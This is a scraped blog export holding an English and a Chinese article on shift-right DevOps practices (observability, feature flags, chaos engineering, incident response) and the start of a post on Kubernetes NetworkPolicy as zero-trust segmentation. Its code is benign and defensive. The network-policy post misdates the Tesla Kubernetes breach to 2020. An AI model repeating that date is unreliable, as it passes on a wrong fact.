running systems at massive scale. 1. Production Monitoring and Observability Traditional monitoring asks “Is the system up?” Observability asks “Why is the system behaving this way?” Monitoring tracks predefined metrics: CPU usage, memory consumption, request rates, error counts. You know what to measure because you’ve seen these problems before. Observability lets you ask arbitrary questions about system behavior: “Why did this specific user’s request take 5 seconds?” “What changed between 2 PM and 3 PM that caused latency to spike?” You don’t need to predict the question in advance. graph TB A([🌐 Production System]) --> B([📊 MetricsCPU, Memory, Requests]) A --> C([📝 LogsApplication Events]) A --> D([🔍 TracesRequest Flows]) B --> E([🎯 Observability Platform]) C --> E D --> E E --> F([❓ Ask QuestionsUnderstand Behavior]) style E fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px The Three Pillars of Observability: Metrics: Numerical measurements over time (request rate, error rate, latency percentiles). These provide high-level health indicators. Logs: Discrete events with context (user logged in, payment processed, error occurred). These provide detailed information about specific events. Traces: Request flows through distributed systems (how a single user request travels through microservices). These reveal dependencies and bottlenecks. 🎬 Real-World ScenarioYour monitoring shows error rates increased at 2:15 PM. That's monitoring. With observability, you can: Filter traces to requests that failed after 2:15 PM Discover they all called a specific microservice Check logs from that service and find a deployment happened at 2:14 PM Identify the exact code change that introduced the bug All of this happens in minutes, not hours. Implementing Observability: Structured Logging: Use consistent log formats with searchable fields Distributed Tracing: Instrument code to track requests across services Custom Metrics: Track business-specific indicators, not just infrastructure Correlation IDs: Link related events across systems Dashboards: Visualize system behavior in real-time 2. Feature Flags and Progressive Delivery Feature flags decouple deployment from release. You can deploy code to production without exposing it to users, then gradually enable features for specific audiences. How Feature Flags Work: if (featureFlags.isEnabled(&#39;new-checkout-flow&#39;, user)) &#123; &#x2F;&#x2F; New code path return newCheckoutExperience(user); &#125; else &#123; &#x2F;&#x2F; Existing code path return currentCheckoutExperience(user); &#125; This simple pattern enables powerful deployment strategies: Canary Releases: Enable the feature for 1% of users, monitor for issues, gradually increase to 100%. A/B Testing: Show different versions to different user groups, measure which performs better. Ring Deployment: Roll out to internal users first, then beta users, then general availability. Kill Switches: Instantly disable problematic features without redeploying. graph TB A([🚀 Deploy to Production]) --> B{Feature Flag} B -->|1% Users| C([👥 Canary Group]) B -->|99% Users| D([👥 Existing Experience]) C --> E{Monitor Metrics} E -->|Success| F([📈 Increase to 10%]) E -->|Issues| G([🔴 Disable Flag]) F --> H([Continue Gradual Rollout]) style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Benefits: Risk Reduction: Problems affect only a small percentage of users Fast Rollback: Disable features instantly without redeploying Data-Driven Decisions: Measure real user behavior before full rollout Decoupled Releases: Deploy when ready, release when confident ⚠️ Feature Flag HygieneFeature flags are powerful but can become technical debt. Establish practices: Remove flags after full rollout (don't accumulate dead flags) Document flag purposes and owners Set expiration dates for temporary flags Monitor flag usage and clean up unused flags regularly 3. Chaos Engineering Chaos engineering deliberately introduces failures into production systems to verify they can withstand turbulent conditions. It sounds counterintuitive, but it’s based on a simple premise: if you’re going to have failures (and you will), better to have them on your terms. The Chaos Engineering Process: Define Steady State: Establish metrics that indicate normal system behavior (e.g., 99.9% of requests succeed within 200ms) Hypothesize: Predict how the system should behave when something fails (e.g., “If the payment service goes down, users should see a friendly error message and orders should queue for retry”) Introduce Chaos: Deliberately cause the failure in production (e.g., terminate payment service instances) Observe: Monitor whether the system maintains steady state Learn and Improve: If the system doesn’t behave as expected, fix the issues and repeat graph LR A([📊 DefineSteady State]) --> B([🤔 HypothesizeBehavior]) B --> C([💥 IntroduceChaos]) C --> D([👀 ObserveResults]) D --> E{Steady StateMaintained?} E -->|Yes| F([✅ ConfidenceIncreased]) E -->|No| G([🔧 Fix Issues]) G --> A style C fill:#ffebee,stroke:#c62828,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px Common Chaos Experiments: Network Failures: Introduce latency between services Drop packets randomly Simulate network partitions Resource Exhaustion: Fill disk space Consume all available memory Max out CPU usage Service Failures: Terminate random instances Crash specific services Simulate dependency failures Time-Based Issues: Introduce clock skew Simulate time zone problems Test leap second handling 🎯 Start SmallDon't start chaos engineering by randomly terminating production servers. Begin with: Non-production environments: Practice in staging first Small blast radius: Affect only a subset of traffic Business hours: Run experiments when teams are available Gradual escalation: Start with minor issues, increase severity over time As confidence grows, expand scope and automate experiments. Tools for Chaos Engineering: Chaos Monkey: Randomly terminates instances (Netflix’s original tool) Gremlin: Commercial platform with comprehensive failure injection Chaos Mesh: Kubernetes-native chaos engineering platform AWS Fault Injection Simulator: Managed chaos engineering for AWS 4. Production Testing Some tests only make sense in production. These aren’t about finding bugs - they’re about validating that real systems behave correctly under real conditions. Synthetic Monitoring: Automated tests that run continuously against production, simulating user journeys: &#x2F;&#x2F; Synthetic test running every 5 minutes async function checkoutFlow() &#123; &#x2F;&#x2F; 1. Browse products await navigateTo(&#39;&#x2F;products&#39;); &#x2F;&#x2F; 2. Add item to cart await addToCart(&#39;product-123&#39;); &#x2F;&#x2F; 3. Proceed to checkout await checkout(); &#x2F;&#x2F; 4. Verify order confirmation assert(orderConfirmed()); &#125; These tests alert you to problems before real users encounter them. Smoke Tests: Quick validation after deployment that critical paths work: Can users log in? Can they view their dashboard? Can they perform core actions? Production Canaries: Dedicated instances that receive real traffic but are monitored more closely. If canaries show problems, traffic is redirected before affecting all users. 🎬 Production Testing in ActionAn e-commerce site runs synthetic tests every minute: Browse products Add to cart Complete checkout At 3:47 AM, the checkout test fails. The payment gateway is down. The team is alerted immediately and switches to a backup payment provider. When the first real customer tries to check out at 6:15 AM, everything works perfectly. Without production testing, the issue wouldn't be discovered until customers complained. 5. Incident Response and Learning Incidents are inevitable. What matters is how you respond and what you learn. Effective Incident Response: Detection: Automated alerts based on observability data catch issues quickly. Triage: On-call engineers assess severity and impact, deciding whether to escalate. Communication: Status pages and internal channels keep stakeholders informed. Mitigation: Fix the immediate problem (rollback, failover, scale up). Resolution: Address the root cause permanently. Post-Incident Review: Learn from what happened without blame. graph TB A([🚨 Incident Detected]) --> B([🔍 TriageAssess Impact]) B --> C([📢 CommunicateNotify Stakeholders]) C --> D([🔧 MitigateStop the Bleeding]) D --> E([✅ ResolveFix Root Cause]) E --> F([📝 Post-Incident ReviewLearn & Improve]) F -.Prevent Future Incidents.-> G([🛡️ Implement Safeguards]) style A fill:#ffebee,stroke:#c62828,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px Blameless Post-Mortems: The goal isn’t to find who caused the incident - it’s to understand why the system allowed it to happen. Questions to ask: What happened? (Timeline of events) Why did it happen? (Root causes, not just symptoms) How did we detect it? (Could we detect it faster?) How did we respond? (What worked? What didn’t?) How do we prevent it? (Concrete action items) 📚 Learning from IncidentsEvery incident is a learning opportunity: Document thoroughly: Future you will forget details Share widely: Other teams can learn from your experience Track action items: Ensure improvements actually happen Measure MTTR: Track Mean Time To Recovery as a key metric Celebrate learning: Recognize teams that handle incidents well Balancing Shift-Left and Shift-Right The most effective DevOps organizations don’t choose between shift-left and shift-right - they embrace both. Each addresses different aspects of software quality: graph TB subgraph \"Shift-Left: Prevention\" A([Unit Tests]) B([Static Analysis]) C([Security Scans]) D([Integration Tests]) end subgraph \"Deployment\" E([🚀 Production]) end subgraph \"Shift-Right: Detection & Learning\" F([Monitoring]) G([Chaos Engineering]) H([Feature Flags]) I([Incident Response]) end A --> E B --> E C --> E D --> E E --> F E --> G E --> H E --> I I -.Feedback.-> A style E fill:#e3f2fd,stroke:#1976d2,stroke-width:3px When to Emphasize Shift-Left: Known Risks: Issues you’ve seen before and can test for Compliance Requirements: Security and regulatory checks that must pass before deployment Cost-Effective Prevention: Problems that are cheap to catch early but expensive to fix in production Deterministic Behavior: Functionality that behaves predictably and can be fully tested When to Emphasize Shift-Right: Unknown Unknowns: Issues you can’t predict or test for in advance Scale-Dependent Problems: Behavior that only emerges under production load User Behavior: How real users actually interact with your system Infrastructure Complexity: Distributed systems with emergent failure modes Rapid Innovation: When speed to market outweighs perfect pre-production testing ✨ The Ideal BalanceShift-left to catch what you can before production. Shift-right to handle what you can't. Together, they create a complete quality strategy: Prevent predictable problems (shift-left) Detect unpredictable problems quickly (shift-right) Learn from production to improve prevention (feedback loop) Getting Started with Shift-Right Ready to implement shift-right practices? Here’s a practical roadmap: Phase 1: Foundation (Weeks 1-4) Improve Observability: Implement structured logging across services Add distributed tracing to critical paths Create dashboards for key business metrics Set up alerting for anomalies Start Small: Begin with one service or component Focus on understanding current behavior before changing anything Document what you learn Phase 2: Progressive Delivery (Weeks 5-8) Implement Feature Flags: Choose a feature flag platform (LaunchDarkly, Split, or open-source alternatives) Start with one new feature behind a flag Practice canary releases with gradual rollout Establish flag hygiene practices Synthetic Monitoring: Identify critical user journeys Create automated tests that run against production Set up alerts for test failures Gradually expand coverage Phase 3: Resilience Testing (Weeks 9-12) Chaos Engineering: Start in non-production environments Run first experiments during business hours with team present Begin with simple failures (terminate one instance) Document learnings and fix discovered issues Gradually increase experiment complexity Incident Response: Document current incident response process Establish on-call rotations Create runbooks for common issues Practice incident response with game days Phase 4: Continuous Improvement (Ongoing) Feedback Loops: Conduct blameless post-mortems after incidents Track action items to completion Share learnings across teams Measure and improve key metrics (MTTR, deployment frequency, change failure rate) Culture: Celebrate learning from failures Reward teams that improve resilience Share production insights with development teams Make observability data accessible to everyone 🎯 Success MetricsTrack these metrics to measure shift-right effectiveness: Mean Time To Detection (MTTD): How quickly you discover issues Mean Time To Recovery (MTTR): How quickly you resolve issues Change Failure Rate: Percentage of deployments causing incidents Deployment Frequency: How often you can safely deploy Customer Impact: Percentage of users affected by incidents Shift-right practices should improve all of these over time. Conclusion: Completing the DevOps Cycle Shift-left transformed software development by catching issues early. It reduced bugs, improved security, and accelerated delivery. These achievements are real and valuable. But shift-left alone is incomplete. Production environments are too complex, user behavior too unpredictable, and infrastructure too distributed for pre-production testing to catch everything. We need practices that embrace production as a learning environment. Shift-right completes the DevOps cycle. It extends quality practices beyond deployment with observability, progressive delivery, chaos engineering, production testing, and continuous learning. Together with shift-left, it creates a comprehensive approach to software quality: Prevent what you can before production (shift-left) Detect what you can’t prevent quickly (shift-right) Learn from production to improve prevention (feedback loop) The future of DevOps isn’t choosing between shift-left and shift-right - it’s mastering both. Organizations that do will build more resilient systems, respond to incidents faster, and deliver better experiences to users. The question isn’t whether to shift right. It’s how quickly you can start. 💭 Final Thought&quot;Hope is not a strategy, but neither is fear. Shift-left reduces risk through prevention. Shift-right builds confidence through resilience. Together, they transform how we build and operate software.&quot;","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"},{"name":"Monitoring","slug":"Monitoring","permalink":"https://neo01.com/tags/Monitoring/"},{"name":"Operations","slug":"Operations","permalink":"https://neo01.com/tags/Operations/"}],"lang":"en"},{"title":"左移之后的右移：完整的 DevOps 全景","slug":"2022/11/Shift-Right-After-Shift-Left-DevOps-zh-CN","date":"un55fin55","updated":"un55fin55","comments":true,"path":"/zh-CN/2022/11/Shift-Right-After-Shift-Left-DevOps/","permalink":"https://neo01.com/zh-CN/2022/11/Shift-Right-After-Shift-Left-DevOps/","excerpt":"左移将测试提前到开发早期。但接下来呢？探索通过生产监控、混沌工程和持续学习来完善 DevOps 循环的右移实践。","text":"多年来，DevOps 世界一直在热议&quot;左移&quot;——在开发周期的早期阶段引入测试、安全和质量检查。我们已经实现了单元测试自动化，将安全扫描集成到 CI/CD 流水线中，并在 bug 到达生产环境之前捕获它们。这是革命性的。 但问题是：左移只是故事的一半。 当我们忙于完善预生产流程时，生产环境变得越来越复杂。微服务、分布式系统和云原生架构创造了在开发中无法预测的故障模式。无论进行多少预生产测试，都无法模拟真实用户、真实数据和大规模真实基础设施的混乱。 这就是&quot;右移&quot;的用武之地——将 DevOps 实践扩展到生产环境及其之后。这不是要放弃左移原则；而是通过将生产环境视为学习环境的实践来完成循环。 理解左移：快速回顾 在探索右移之前，让我们先明确左移实现了什么。传统的软件开发生命周期是这样的： graph LR A([📝 需求]) --> B([💻 开发]) B --> C([🧪 测试]) C --> D([🚀 部署]) D --> E([⚙️ 运维]) style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px style E fill:#ffebee,stroke:#c62828,stroke-width:2px 测试发生得很晚，在开发&quot;完成&quot;之后。在这个阶段发现 bug 的成本很高——代码必须返回给已经转向其他项目的开发人员。反馈循环缓慢且成本高昂。 左移将质量实践提前： graph LR A([📝 需求+ 测试计划]) --> B([💻 开发+ 单元测试]) B --> C([🧪 集成测试+ 安全扫描]) C --> D([🚀 部署]) D --> E([⚙️ 运维]) style A fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style B fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style C fill:#fff3e0,stroke:#f57c00,stroke-width:2px 关键左移实践： 测试驱动开发（TDD）：在编写代码之前编写测试 持续集成：每次提交时自动化测试 静态代码分析：在不运行代码的情况下捕获问题 安全扫描：尽早发现漏洞 基础设施即代码：测试基础设施配置 这些实践显著提高了软件质量并降低了成本。但它们有一个共同的局限性：它们都发生在生产环境之前。 右移哲学 右移认识到一个基本事实：生产环境是不同的。无论你在开发中测试得多么彻底，生产环境都会给你惊喜。用户的行为不可预测。基础设施以意想不到的方式失败。负载模式创造了你从未预料到的瓶颈。 右移不是将生产环境视为应该&quot;正常工作&quot;的黑盒，而是将生产环境视为学习环境。它将 DevOps 实践扩展到部署之外： graph LR A([📝 需求]) --> B([💻 开发]) B --> C([🧪 测试]) C --> D([🚀 部署]) D --> E([⚙️ 运维+ 监控]) E --> F([📊 分析+ 学习]) F -.反馈.-> A style E fill:#e0f2f1,stroke:#00796b,stroke-width:2px style F fill:#f3e5f5,stroke:#7b1fa2,stroke-width:2px 核心右移原则： 生产环境是测试环境：接受某些问题只会在生产环境中出现。设计系统以优雅地检测和处理它们。 可观测性优于监控：不仅仅是收集指标——理解系统行为。提出你的系统可以回答的问题。 快速失败，更快学习：拥抱受控的失败以建立韧性。从生产事故中学习以改进整个系统。 持续反馈：使用生产数据为开发决策提供信息。在运维和开发之间形成闭环。 💡 左移 vs 右移左移：在生产环境之前预防问题 右移：在生产环境中检测、响应和学习问题 两者都是必不可少的。左移减少了到达生产环境的问题数量。右移确保你能处理不可避免会出现的问题。 关键右移实践 让我们探讨使右移有效的实践。这些不是理论概念——它们是大规模运行系统的组织使用的经过实战检验的方法。 1. 生产监控和可观测性 传统监控问&quot;系统是否正常运行？“可观测性问&quot;系统为什么会这样运行？” 监控跟踪预定义的指标：CPU 使用率、内存消耗、请求速率、错误计数。你知道要测量什么，因为你以前见过这些问题。 可观测性让你可以对系统行为提出任意问题：“为什么这个特定用户的请求花了 5 秒？”&quot;下午 2 点到 3 点之间发生了什么变化导致延迟激增？&quot;你不需要提前预测问题。 graph TB A([🌐 生产系统]) --> B([📊 指标CPU、内存、请求]) A --> C([📝 日志应用程序事件]) A --> D([🔍 追踪请求流]) B --> E([🎯 可观测性平台]) C --> E D --> E E --> F([❓ 提出问题理解行为]) style E fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 可观测性的三大支柱： 指标：随时间变化的数值测量（请求速率、错误率、延迟百分位数）。这些提供高层次的健康指标。 日志：带有上下文的离散事件（用户登录、支付处理、错误发生）。这些提供有关特定事件的详细信息。 追踪：通过分布式系统的请求流（单个用户请求如何在微服务中传播）。这些揭示依赖关系和瓶颈。 🎬 真实场景你的监控显示错误率在下午 2:15 增加。这是监控。 有了可观测性，你可以： 过滤下午 2:15 之后失败的请求追踪 发现它们都调用了一个特定的微服务 检查该服务的日志，发现下午 2:14 发生了部署 识别引入 bug 的确切代码更改 所有这些都在几分钟内完成，而不是几小时。 实施可观测性： 结构化日志：使用具有可搜索字段的一致日志格式 分布式追踪：检测代码以跟踪跨服务的请求 自定义指标：跟踪特定于业务的指标，而不仅仅是基础设施 关联 ID：跨系统链接相关事件 仪表板：实时可视化系统行为 2. 特性开关和渐进式交付 特性开关将部署与发布解耦。你可以将代码部署到生产环境而不向用户公开，然后逐步为特定受众启用功能。 特性开关的工作原理： if (featureFlags.isEnabled('new-checkout-flow', user)) &#123; // 新代码路径 return newCheckoutExperience(user); &#125; else &#123; // 现有代码路径 return currentCheckoutExperience(user); &#125; 这个简单的模式支持强大的部署策略： 金丝雀发布：为 1% 的用户启用功能，监控问题，逐步增加到 100%。 A/B 测试：向不同的用户组显示不同的版本，测量哪个表现更好。 环形部署：首先向内部用户推出，然后是测试用户，最后是正式发布。 终止开关：无需重新部署即可立即禁用有问题的功能。 graph TB A([🚀 部署到生产环境]) --> B{特性开关} B -->|1% 用户| C([👥 金丝雀组]) B -->|99% 用户| D([👥 现有体验]) C --> E{监控指标} E -->|成功| F([📈 增加到 10%]) E -->|问题| G([🔴 禁用开关]) F --> H([继续逐步推出]) style E fill:#fff3e0,stroke:#f57c00,stroke-width:2px style G fill:#ffebee,stroke:#c62828,stroke-width:2px style H fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 好处： 降低风险：问题只影响一小部分用户 快速回滚：无需重新部署即可立即禁用功能 数据驱动决策：在完全推出之前测量真实用户行为 解耦发布：准备好时部署，有信心时发布 ⚠️ 特性开关卫生特性开关很强大，但可能成为技术债务。建立实践： 完全推出后删除开关（不要积累死开关） 记录开关的目的和所有者 为临时开关设置过期日期 定期监控开关使用情况并清理未使用的开关 3. 混沌工程 混沌工程故意在生产系统中引入故障，以验证它们能够承受动荡的条件。这听起来违反直觉，但它基于一个简单的前提：如果你将会有故障（而且你会），最好在你的条件下发生。 混沌工程流程： 定义稳定状态：建立指示正常系统行为的指标（例如，99.9% 的请求在 200 毫秒内成功） 假设：预测当某些东西失败时系统应该如何表现（例如，“如果支付服务宕机，用户应该看到友好的错误消息，订单应该排队重试”） 引入混沌：在生产环境中故意造成故障（例如，终止支付服务实例） 观察：监控系统是否保持稳定状态 学习和改进：如果系统没有按预期表现，修复问题并重复 graph LR A([📊 定义稳定状态]) --> B([🤔 假设行为]) B --> C([💥 引入混沌]) C --> D([👀 观察结果]) D --> E{稳定状态保持？} E -->|是| F([✅ 信心增加]) E -->|否| G([🔧 修复问题]) G --> A style C fill:#ffebee,stroke:#c62828,stroke-width:2px style F fill:#e8f5e9,stroke:#388e3c,stroke-width:2px style G fill:#fff3e0,stroke:#f57c00,stroke-width:2px 常见混沌实验： 网络故障： 在服务之间引入延迟 随机丢弃数据包 模拟网络分区 资源耗尽： 填满磁盘空间 消耗所有可用内存 最大化 CPU 使用率 服务故障： 终止随机实例 崩溃特定服务 模拟依赖故障 基于时间的问题： 引入时钟偏移 模拟时区问题 测试闰秒处理 🎯 从小处开始不要通过随机终止生产服务器来开始混沌工程。从以下开始： 非生产环境：首先在预发布环境中练习 小爆炸半径：只影响一部分流量 工作时间：在团队可用时运行实验 逐步升级：从小问题开始，随着时间的推移增加严重性 随着信心的增长，扩大范围并自动化实验。 混沌工程工具： Chaos Monkey：随机终止实例（Netflix 的原始工具） Gremlin：具有全面故障注入的商业平台 Chaos Mesh：Kubernetes 原生混沌工程平台 AWS Fault Injection Simulator：AWS 的托管混沌工程 4. 生产测试 有些测试只在生产环境中有意义。这些不是为了发现 bug——而是为了验证真实系统在真实条件下是否正确运行。 合成监控：针对生产环境持续运行的自动化测试，模拟用户旅程： // 每 5 分钟运行一次的合成测试 async function checkoutFlow() &#123; // 1. 浏览产品 await navigateTo('/products'); // 2. 添加商品到购物车 await addToCart('product-123'); // 3. 进入结账 await checkout(); // 4. 验证订单确认 assert(orderConfirmed()); &#125; 这些测试在真实用户遇到问题之前向你发出警报。 冒烟测试：部署后快速验证关键路径是否工作： 用户能登录吗？ 他们能查看仪表板吗？ 他们能执行核心操作吗？ 生产金丝雀：接收真实流量但受到更密切监控的专用实例。如果金丝雀显示问题，流量会在影响所有用户之前被重定向。 🎬 生产测试实战一个电子商务网站每分钟运行合成测试： 浏览产品 添加到购物车 完成结账 凌晨 3:47，结账测试失败。支付网关宕机了。 团队立即收到警报并切换到备用支付提供商。当第一个真实客户在早上 6:15 尝试结账时，一切都完美运行。 如果没有生产测试，直到客户投诉才会发现问题。 5. 事故响应和学习 事故是不可避免的。重要的是你如何响应以及你学到了什么。 有效的事故响应： 检测：基于可观测性数据的自动化警报快速捕获问题。 分类：值班工程师评估严重性和影响，决定是否升级。 沟通：状态页面和内部渠道让利益相关者了解情况。 缓解：修复眼前的问题（回滚、故障转移、扩容）。 解决：永久解决根本原因。 事后审查：从发生的事情中学习，不归咎于人。 graph TB A([🚨 检测到事故]) --> B([🔍 分类评估影响]) B --> C([📢 沟通通知利益相关者]) C --> D([🔧 缓解止血]) D --> E([✅ 解决修复根本原因]) E --> F([📝 事后审查学习和改进]) F -.预防未来事故.-> G([🛡️ 实施保障措施]) style A fill:#ffebee,stroke:#c62828,stroke-width:2px style D fill:#fff3e0,stroke:#f57c00,stroke-width:2px style F fill:#e3f2fd,stroke:#1976d2,stroke-width:2px style G fill:#e8f5e9,stroke:#388e3c,stroke-width:2px 无责备事后分析： 目标不是找出谁造成了事故——而是理解为什么系统允许它发生。要问的问题： 发生了什么？（事件时间线） 为什么会发生？（根本原因，而不仅仅是症状） 我们如何检测到它？（我们能更快地检测到吗？） 我们如何响应？（什么有效？什么无效？） 我们如何预防它？（具体的行动项目） 📚 从事故中学习每个事故都是学习机会： 彻底记录：未来的你会忘记细节 广泛分享：其他团队可以从你的经验中学习 跟踪行动项目：确保改进真正发生 测量 MTTR：将平均恢复时间作为关键指标跟踪 庆祝学习：认可处理事故良好的团队 平衡左移和右移 最有效的 DevOps 组织不会在左移和右移之间做选择——他们两者都拥抱。每个都解决软件质量的不同方面： graph TB subgraph \"左移：预防\" A([单元测试]) B([静态分析]) C([安全扫描]) D([集成测试]) end subgraph \"部署\" E([🚀 生产环境]) end subgraph \"右移：检测和学习\" F([监控]) G([混沌工程]) H([特性开关]) I([事故响应]) end A --> E B --> E C --> E D --> E E --> F E --> G E --> H E --> I I -.反馈.-> A style E fill:#e3f2fd,stroke:#1976d2,stroke-width:3px 何时强调左移： 已知风险：你以前见过并可以测试的问题 合规要求：必须在部署前通过的安全和监管检查 成本效益预防：早期捕获成本低但在生产环境中修复成本高的问题 确定性行为：行为可预测且可以完全测试的功能 何时强调右移： 未知的未知：你无法提前预测或测试的问题 规模依赖问题：只在生产负载下出现的行为 用户行为：真实用户实际如何与你的系统交互 基础设施复杂性：具有突发故障模式的分布式系统 快速创新：当上市速度超过完美的预生产测试时 ✨ 理想的平衡左移以在生产环境之前捕获你能捕获的。 右移以处理你无法捕获的。 它们共同创造了完整的质量策略： 预防可预测的问题（左移） 快速检测不可预测的问题（右移） 从生产环境中学习以改进预防（反馈循环） 开始右移 准备好实施右移实践了吗？这里有一个实用的路线图： 第一阶段：基础（第 1-4 周） 改进可观测性： 在服务之间实施结构化日志 为关键路径添加分布式追踪 为关键业务指标创建仪表板 为异常设置警报 从小处开始： 从一个服务或组件开始 在更改任何内容之前专注于理解当前行为 记录你学到的东西 第二阶段：渐进式交付（第 5-8 周） 实施特性开关： 选择特性开关平台（LaunchDarkly、Split 或开源替代方案） 从一个开关后面的新功能开始 通过逐步推出练习金丝雀发布 建立开关卫生实践 合成监控： 识别关键用户旅程 创建针对生产环境运行的自动化测试 为测试失败设置警报 逐步扩大覆盖范围 第三阶段：韧性测试（第 9-12 周） 混沌工程： 在非生产环境中开始 在工作时间运行第一次实验，团队在场 从简单的故障开始（终止一个实例） 记录学习并修复发现的问题 逐步增加实验复杂性 事故响应： 记录当前事故响应流程 建立值班轮换 为常见问题创建运行手册 通过游戏日练习事故响应 第四阶段：持续改进（持续进行） 反馈循环： 在事故后进行无责备事后分析 跟踪行动项目直到完成 跨团队分享学习 测量和改进关键指标（MTTR、部署频率、变更失败率） 文化： 庆祝从失败中学习 奖励提高韧性的团队 与开发团队分享生产洞察 让每个人都能访问可观测性数据 🎯 成功指标跟踪这些指标以衡量右移的有效性： 平均检测时间（MTTD）：你发现问题的速度 平均恢复时间（MTTR）：你解决问题的速度 变更失败率：导致事故的部署百分比 部署频率：你可以安全部署的频率 客户影响：受事故影响的用户百分比 右移实践应该随着时间的推移改善所有这些指标。 结论：完成 DevOps 循环 左移通过尽早捕获问题改变了软件开发。它减少了 bug，提高了安全性，并加速了交付。这些成就是真实且有价值的。 但仅靠左移是不完整的。生产环境太复杂，用户行为太不可预测，基础设施太分布式，预生产测试无法捕获所有内容。我们需要将生产环境视为学习环境的实践。 右移完成了 DevOps 循环。它通过可观测性、渐进式交付、混沌工程、生产测试和持续学习将质量实践扩展到部署之外。与左移一起，它创造了软件质量的综合方法： 预防你在生产环境之前能预防的（左移） 检测你无法预防的快速检测（右移） 学习从生产环境中学习以改进预防（反馈循环） DevOps 的未来不是在左移和右移之间做选择——而是掌握两者。做到这一点的组织将构建更具韧性的系统，更快地响应事故，并为用户提供更好的体验。 问题不是是否要右移。而是你能多快开始。 💭 最后的思考&quot;希望不是策略，恐惧也不是。左移通过预防降低风险。右移通过韧性建立信心。它们共同改变了我们构建和运营软件的方式。&quot; commentBox('5765834504929280-proj')","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://neo01.com/tags/DevOps/"},{"name":"Testing","slug":"Testing","permalink":"https://neo01.com/tags/Testing/"},{"name":"Monitoring","slug":"Monitoring","permalink":"https://neo01.com/tags/Monitoring/"},{"name":"Operations","slug":"Operations","permalink":"https://neo01.com/tags/Operations/"}],"lang":"zh-CN"},{"title":"Kubernetes Network Policy - Why Zero Trust Matters in Enterprise","slug":"2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise","date":"un66fin66","updated":"un55fin55","comments":true,"path":"2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise/","permalink":"https://neo01.com/2022/10/Kubernetes-Network-Policy-Why-Zero-Trust-Matters-In-Enterprise/","excerpt":"In Kubernetes, every pod can talk to every other pod by default. For enterprises, that's not security—that's a breach waiting to happen. Discover why network policies are your first line of defense.","text":"In the world of Kubernetes, there’s a dangerous default that many enterprises overlook: every pod can communicate with every other pod, across all namespaces, without restriction. It’s like building an office where every door is unlocked, every file cabinet is open, and every employee has access to every room. Convenient? Yes. Secure? Absolutely not. For enterprises handling sensitive data, regulatory compliance, or multi-tenant environments, this flat network model is a ticking time bomb. One compromised pod can become a launchpad for lateral movement across your entire cluster. This is where Kubernetes Network Policy becomes not just important, but essential. The Flat Network Problem Kubernetes was designed with simplicity in mind. By default, the network model is flat—any pod can reach any other pod using its IP address. This makes development easy and removes networking complexity, but it creates a massive security gap. Consider a typical enterprise application: Frontend pods serving user requests Backend API pods processing business logic Database pods storing sensitive customer data Admin pods for cluster management Third-party integration pods connecting to external services In a default Kubernetes setup, a compromised frontend pod can directly access your database pods. An exploited third-party integration can reach your admin tools. There are no barriers, no checkpoints, no segmentation. 🚨 The Breach ScenarioAn attacker exploits a vulnerability in your public-facing web application. They gain shell access to a frontend pod. Without network policies, they can now scan the entire cluster, discover database pods, and exfiltrate customer data—all because nothing stopped them from making those connections. This isn’t theoretical. The 2020 Tesla Kubernetes breach happened because an exposed Kubernetes dashboard led to compromised pods that could access AWS credentials stored elsewhere in the cluster. Network segmentation could have limited the blast radius. Enter Network Policy: Zero Trust for Kubernetes Kubernetes Network Policy is a specification that defines how pods can communicate with each other and with external endpoints. It’s the firewall for your cluster, but instead of IP addresses and ports, you define rules based on pod labels, namespaces, and CIDR blocks. The core principle is simple: deny by default, allow explicitly. This is zero trust networking—nothing is trusted until proven necessary. A basic network policy looks like this: apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: backend-policy namespace: production spec: podSelector: matchLabels: app: backend policyTypes: - Ingress - Egress ingress: - from: - podSelector: matchLabels: app: frontend ports: - protocol: TCP port: 8080 egress: - to: - podSelector: matchLabels: app: database ports: - protocol: TCP port: 5432 This policy says: “Backend pods can only receive traffic from frontend pods on port 8080, and can only send traffic to database pods on port 5432.” Everything else is blocked. ✅ Defense in DepthNetwork policies don't replace application-level security, authentication, or encryption. They're one layer in a defense-in-depth strategy. Even if an attacker compromises a pod, network policies limit what they can reach. Why Enterprises Can’t Ignore This For enterprises, network policies aren’t optional—they’re a compliance and security necessity: Regulatory compliance: Standards like PCI-DSS, HIPAA, and SOC 2 require network segmentation. You must demonstrate that sensitive data is isolated from less-trusted components. Network policies provide auditable, declarative proof of segmentation. Multi-tenancy: If you’re running multiple teams or customers on the same cluster, network policies prevent one tenant from accessing another’s resources. Without them, namespace isolation is purely logical, not enforced. Blast radius limitation: When (not if) a security incident occurs, network policies contain the damage. A compromised pod in the development namespace can’t reach production. A breached frontend can’t access the database directly. Audit and visibility: Network policies are declarative and version-controlled. You can audit who changed what, when, and why. Compare this to traditional firewall rules buried in network appliances. Cost efficiency: Instead of deploying separate clusters for each security zone (expensive and operationally complex), you can use network policies to create secure boundaries within a single cluster. 📊 Compliance RequirementsPCI-DSS Requirement 1.2.1 explicitly mandates restricting inbound and outbound traffic to that which is necessary for the cardholder data environment. Network policies are the Kubernetes-native way to meet this requirement. The Alternatives: Attribute-Based Firewalls and Service Mesh Network policies aren’t the only game in town. Enterprises have other options for 